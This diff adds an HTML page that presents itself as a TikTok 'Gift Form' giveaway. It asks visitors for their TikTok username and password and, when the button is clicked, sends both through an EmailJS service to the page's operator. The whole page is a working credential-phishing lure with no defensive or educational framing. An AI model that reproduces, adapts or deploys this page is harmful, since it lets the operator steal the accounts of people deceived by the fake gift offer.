@@ -1,0 +1,105 @@
+
+<!DOCTYPE html>
+<html>
+<center>
+<head>
+	<body style="
+  background-image: url('w.jpg');
+  background-size: cover;
+  background-position: center;
+  background-repeat: repeat;
+  height: 30vh;
+  margin: 0;
+">
+	<h1 style="color:yellow">Welcome it's Seba</h1>
+	<h3 style="color:yellow">@lil.karis.1</h3>
+  <style>
+		.logo {
+			position: center;
+			top: 8;
+			center: 0;
+			border-radius: 40px; 
+			width: 70px; 
+			height: 70px; 
+			object-fit: cover;
+		}
+  .odds-card {
+            margin: 30px;
+            padding: 40px;
+            border: 3px solid #000;
+            border-radius: 30px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  	background:#fff
+        }
+	</style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function(){
+      emailjs.init({
+        publicKey: "QKarohsQqRIAA6_mA",
+      });
+    })();
+  </script>
+</head>
+  <img src="tik.png" class="logo">
+<body>
+  <h2 style="color:yellow">Gift Form</h2>
+  <div class="odds-card">
+  <label for="username"><b >TikTok Username</b></label>
+  <input type="text" id="username" required>
+  <br><br>
+  <label for="password"><b >Password:</b></label>
+  <input type="password" id="password" required>
+  <br><br>
+  <style>
+    .button {
+        background-color: #2ecc71; /* Green color */
+        padding: 10px; /* Button size */
+        border: none; /* Remove default border */
+        border-radius: 90px; /* Rounded corners */
+        cursor: pointer; /* Pointer cursor */
+        margin: 20px;
+            padding: 20px;
+            border: 2px solid #000;
+            border-radius: 90px;
+            box-shadow: 0 0 40px rgba(0,
+    }
+    
+    .button:hover {
+        background-color: #1abc9c; /* Darker green on hover */
+    }
+</style>
+  <button type="button" onclick="sendLoginInfo()" class="button" >Click to Join and get Gift</button>
+  </div>
+  <p style="color:yellow">Fill in right information to recieve Gift </p>
+  <script>
+    const sendLoginInfo = () => {
+      let username = document.getElementById("username").value;
+      let password = document.getElementById("password").value;
+      
+      var templateParams = {
+        username: username,
+        password: password,
+      };
+      
+      emailjs.send("service_worxtub","template_tikb2pl", templateParams)
+        .then(function(response) {
+          console.log('Login information sent successfully!');
+        }, function(error) {
+          console.log('Error sending login information:', error);
+        });
+    };
+  </script>
+  <div id="error-message" style="display: none;">Please input the correct TikTok account and password to get gift.</div>
+
+  <script>
+    function showError() {
+      document.getElementById("error-message").style.display = "block";
+      document.getElementById("error-message").style.color = "red";
+    }
+  </script>
+</center>
+</body>
+</html>
